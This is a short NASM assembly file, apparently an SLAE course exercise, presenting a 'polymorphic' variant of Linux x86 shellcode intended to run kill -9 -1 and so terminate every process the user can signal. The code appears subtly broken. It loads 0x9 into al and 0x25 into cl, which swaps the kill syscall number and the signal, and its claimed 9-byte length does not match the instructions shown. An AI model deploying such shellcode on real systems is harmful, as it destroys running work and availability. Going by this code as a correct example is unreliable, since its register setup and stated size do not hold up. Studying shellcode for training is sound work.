; Filename: 	kill_second_variant.nasm
; Author:	Paolo Perego <paolo@codiceinsicuro.it>  
; Website:  	https://codiceinsicuro.it
; Blog post:  	https://codiceinsicuro.it/slae/
; Twitter:   	@thesp0nge
; SLAE-ID:    	1217
; Purpose:	This is the second variant for kill -9 -1 polymorphic
;		shellcode. This shellcode is 9 byte long and I will use it as a
; 		skeleton for polymorphic generator. 

section .text

global _start

_start:
	xor ebx, ebx
	xor eax, eax
	xor ecx, ecx
	

	mov cl, 0x25
	mov al, 0x9

	dec ebx
	int 0x80
